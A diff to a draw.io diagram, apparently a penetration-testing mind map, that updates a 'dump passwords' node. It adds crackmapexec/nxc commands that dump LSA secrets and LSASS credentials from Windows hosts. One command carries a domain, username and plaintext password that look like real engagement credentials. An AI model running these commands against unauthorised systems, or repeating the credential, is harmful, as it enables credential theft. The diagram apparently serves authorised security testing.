@@ -791,9 +791,11 @@
         <mxCell id="ZDy4xXztmy_Uh2uV_-2A-6" edge="1" parent="1" source="ZDy4xXztmy_Uh2uV_-2A-3" style="edgeStyle=orthogonalEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=11;fontColor=default;labelBackgroundColor=default;endArrow=block;endFill=1;" target="orcKsDgMiDMdKtN4nEvD-2">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <mxCell id="ZDy4xXztmy_Uh2uV_-2A-3" parent="1" style="rounded=1;whiteSpace=wrap;html=1;" value="&lt;div&gt;dump passwords&lt;/div&gt;&lt;div&gt;of users who have logged into the machine&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;crackmapexec&lt;/font&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;mimikatz&lt;br&gt;&lt;/font&gt;&lt;/div&gt;" vertex="1">
-          <mxGeometry height="90" width="175" x="897.5" y="365" as="geometry" />
-        </mxCell>
+        <object label="&lt;div&gt;dump passwords&lt;/div&gt;&lt;div&gt;of users who have logged into the machine&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;nxc&lt;/font&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;mimikatz&lt;br&gt;&lt;/font&gt;&lt;/div&gt;" dump_lsa="cme smb &quot;10.8.58.39&quot; -d &quot;group.int&quot; -u &quot;curbano&quot; -p &#39;Nemera2023!&#39; --lsa" dump_lsass="nxc smb 192.168.1.80 -u ieuser -p 123 -M lsassy" id="ZDy4xXztmy_Uh2uV_-2A-3">
+          <mxCell parent="1" style="rounded=1;whiteSpace=wrap;html=1;strokeColor=light-dark(#000000,#E5A50A);" vertex="1">
+            <mxGeometry height="90" width="175" x="897.5" y="365" as="geometry" />
+          </mxCell>
+        </object>
         <mxCell id="ezBXcHe37mE9WKMKeRkE-2" edge="1" parent="1" source="ezBXcHe37mE9WKMKeRkE-1" style="edgeStyle=orthogonalEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0.75;entryY=1;entryDx=0;entryDy=0;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=11;fontColor=default;labelBackgroundColor=default;endArrow=block;endFill=1;" target="orcKsDgMiDMdKtN4nEvD-2">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
